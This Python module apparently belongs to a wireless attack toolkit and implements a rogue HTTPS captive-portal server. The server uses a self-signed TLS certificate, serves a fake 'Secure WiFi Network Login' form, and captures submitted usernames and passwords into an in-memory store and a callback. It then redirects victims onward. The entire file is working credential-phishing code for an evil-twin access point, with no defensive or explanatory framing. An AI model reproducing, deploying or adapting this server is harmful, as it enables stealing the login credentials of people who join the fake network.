"""HTTPSServer – HTTPS captive portal server with SSL support.

Extends the HTTP captive portal with TLS encryption so that browsers
do not display certificate warnings for the captive-portal redirect
(though the certificate is self-signed, so warnings will still appear
unless the client trusts the CA).
"""

import os
import ssl
import threading
from http.server import HTTPServer as _StdHTTPServer
from typing import Callable, Dict, List, Optional

from wifi_aio.exceptions import WiFiConnectionError, WiFiPermissionError
from wifi_aio.logger import get_logger
from wifi_aio.rogue.http_server import _PortalHandler

logger = get_logger("rogue.https_server")


class _TLSHTTPServer(_StdHTTPServer):
    """Standard HTTPServer subclass that wraps the socket with TLS."""

    def __init__(self, bind_addr: tuple, handler_class: type,
                 cert_file: str, key_file: str) -> None:
        super().__init__(bind_addr, handler_class)
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(certfile=cert_file, keyfile=key_file)
        self.socket = ctx.wrap_socket(self.socket, server_side=True)


class HTTPSServer:
    """HTTPS captive portal server with self-signed SSL.

    Parameters
    ----------
    bind_ip:
        IP address to bind to.
    port:
        TCP port to listen on (default 443).
    cert_file:
        Path to the PEM-encoded SSL certificate.
    key_file:
        Path to the PEM-encoded SSL private key.
    portal_html:
        HTML content for the captive portal page.
    redirect_url:
        URL to redirect clients to after credential capture.
    credential_callback:
        Called with a dict of captured credentials on each POST.
    """

    def __init__(
        self,
        bind_ip: str = "10.0.0.1",
        port: int = 443,
        cert_file: str = "/tmp/wifiaio/rogue/server.pem",
        key_file: str = "/tmp/wifiaio/rogue/server-key.pem",
        portal_html: str = "",
        redirect_url: str = "https://www.example.com",
        credential_callback: Optional[Callable[[Dict[str, str]], None]] = None,
    ) -> None:
        self.bind_ip = bind_ip
        self.port = port
        self.cert_file = cert_file
        self.key_file = key_file
        self.portal_html = portal_html or self._default_portal()
        self.redirect_url = redirect_url
        self.credential_callback = credential_callback
        self._server: Optional[_TLSHTTPServer] = None
        self._thread: Optional[threading.Thread] = None
        self._captured: List[Dict[str, str]] = []

    # ── Default portal HTML ────────────────────────────────────────────

    @staticmethod
    def _default_portal() -> str:
        """Return a minimal default HTTPS captive portal page."""
        return """<!DOCTYPE html>
<html>
<head><title>Secure WiFi Login</title></head>
<body>
<h2>Secure WiFi Network Login</h2>
<form method="POST" action="/login">
  <label>Username: <input type="text" name="username"></label><br><br>
  <label>Password: <input type="password" name="password"></label><br><br>
  <input type="submit" value="Connect Securely">
</form>
</body>
</html>"""

    # ── Certificate validation ─────────────────────────────────────────

    def validate_certificates(self) -> bool:
        """Verify the certificate and key files exist and are readable.

        Returns ``True`` if both files are present, ``False`` otherwise.
        """
        cert_ok = os.path.isfile(self.cert_file) and os.access(self.cert_file, os.R_OK)
        key_ok = os.path.isfile(self.key_file) and os.access(self.key_file, os.R_OK)
        if not cert_ok:
            logger.warning("SSL certificate not found or not readable: %s", self.cert_file)
        if not key_ok:
            logger.warning("SSL key not found or not readable: %s", self.key_file)
        return cert_ok and key_ok

    # ── Server lifecycle ───────────────────────────────────────────────

    def start(self) -> None:
        """Start the HTTPS server in a background daemon thread.

        Raises
        ------
        WiFiConnectionError
            If the certificate or key file is missing / unreadable.
        """
        if self._server is not None:
            logger.warning("HTTPS server already running")
            return

        if not self.validate_certificates():
            raise WiFiConnectionError(
                f"SSL certificate or key missing. "
                f"cert={self.cert_file} key={self.key_file}"
            )

        handler = _PortalHandler
        handler.portal_html = self.portal_html
        handler.redirect_url = self.redirect_url
        handler.credential_callback = self._on_credential

        try:
            self._server = _TLSHTTPServer(
                (self.bind_ip, self.port),
                handler,
                self.cert_file,
                self.key_file,
            )
        except ssl.SSLError as exc:
            raise WiFiConnectionError(f"SSL configuration error: {exc}") from exc
        except OSError as exc:
            raise WiFiConnectionError(
                f"Cannot bind {self.bind_ip}:{self.port}: {exc}"
            ) from exc

        self._thread = threading.Thread(
            target=self._server.serve_forever,
            daemon=True,
            name="https-portal",
        )
        self._thread.start()
        logger.info("HTTPS captive portal listening on %s:%d", self.bind_ip, self.port)

    def stop(self) -> None:
        """Shut down the HTTPS server."""
        if self._server is not None:
            self._server.shutdown()
            self._server.server_close()
            self._server = None
            logger.info("HTTPS captive portal stopped")

    def is_running(self) -> bool:
        """Return ``True`` if the server thread is alive."""
        return self._thread is not None and self._thread.is_alive()

    def get_captured(self) -> List[Dict[str, str]]:
        """Return all captured credentials so far."""
        return list(self._captured)

    def clear_captured(self) -> None:
        """Clear the in-memory credential store."""
        self._captured.clear()

    def status(self) -> Dict[str, object]:
        """Return a status dictionary."""
        return {
            "running": self.is_running(),
            "bind": f"{self.bind_ip}:{self.port}",
            "cert_file": self.cert_file,
            "key_file": self.key_file,
            "captured_count": len(self._captured),
        }

    # ── Internals ──────────────────────────────────────────────────────

    def _on_credential(self, creds: Dict[str, str]) -> None:
        """Store credentials and forward to the user callback."""
        self._captured.append(creds)
        if self.credential_callback:
            self.credential_callback(creds)
